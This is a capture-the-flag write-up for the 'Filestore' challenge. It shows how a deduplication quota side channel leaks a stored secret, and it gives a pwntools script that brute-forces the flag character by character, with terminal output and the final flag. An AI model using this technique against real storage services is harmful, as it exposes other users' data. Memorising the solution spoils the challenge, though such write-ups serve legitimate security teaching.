# FILESTORE

## Descrition

We stored our flag on this platform, but forgot to save the id. Can you help us restore it?

`filestore.2021.ctfcompetition.com 1337`

[Attachment](6e5c4cbba595ef1c9d22bfd958dc9144b863081d359a4c27a366c5b8d48b99a26d9b5c4c4bb56db7890b6f188a1ae1b4371d568a22a12e4386d3c0f91dc6c29b.zip)

## Solution

Let's analyze the challenge

```terminal
$ nc filestore.2021.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to our file storage solution.

Menu:
- load
- store
- status
- exit
```

So we can 
- `load` -> retrieve the stored text using the id
```
Send me the file id...
QpNmkzQzzHy4SV8i
123
```
- `store` -> store some text
```
Send me a line of data...
123
Stored! Here's your file id:
QpNmkzQzzHy4SV8i
```
- `status` -> view the memory status
```
User: ctfplayer
Time: Sun Jul 18 20:11:24 2021
Quota: 0.026kB/64.000kB
Files: 1
```
- `exit` -> close the connection

Before analyzing the given file we started to make some test and found that if we enter `CTF{` the `Quota` value didn't change

```terminl
$ nc filestore.2021.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to our file storage solution.

Menu:
- load
- store
- status
- exit
status
User: ctfplayer
Time: Sun Jul 18 20:16:51 2021
Quota: 0.026kB/64.000kB
Files: 1

Menu:
- load
- store
- status
- exit
store
Send me a line of data...
CTF{
Stored! Here's your file id:
kVLwEEpyVwpqwoI4

Menu:
- load
- store
- status
- exit
status
User: ctfplayer
Time: Sun Jul 18 20:16:59 2021
Quota: 0.026kB/64.000kB
Files: 2
```

So maybe we can bruteforce one character of the flag per time

```python
#!/usr/bin/env python3
from pwn import *
import string

nc = remote('filestore.2021.ctfcompetition.com', 1337)

flag = 'CTF{'
last_quota = 26

for i in range(4, 26):
    for c in string.printable:
        nc.recvuntil(b'- exit')
        nc.sendline(b'store')
        nc.sendline((flag + c).encode())

        nc.recvuntil(b'- exit')
        nc.sendline(b'status')

        nc.recvuntil(b'Quota: ')
        quota = int(float(nc.recvuntil(b'kB')[:-2]) * 1000)
        print(c, quota)
        if quota == last_quota:
            flag += c
            print('Found partial flag:', flag)
            break

        last_quota = quota

print('Found flag:', flag)
```

```terminl
$ python filestore.py 
[+] Opening connection to filestore.2021.ctfcompetition.com on port 1337: Done
.
.
.
Found flag: CTF{CR1M3_0f_d3d00CTF{CR1M
```

We are on the right path, some small change to the script and we are good to go

```python
flag = 'CTF{CR1M3_0f_d3d'
```

```terminal
$ python filestore.py 
[+] Opening connection to filestore.2021.ctfcompetition.com on port 1337: Done
.
.
.
Found flag: CTF{CR1M3_0f_d3d0f_d3dup1ic4ti0n000102
```

#### **FLAG >>** `CTF{CR1M3_0f_d3dup1ic4ti0n}`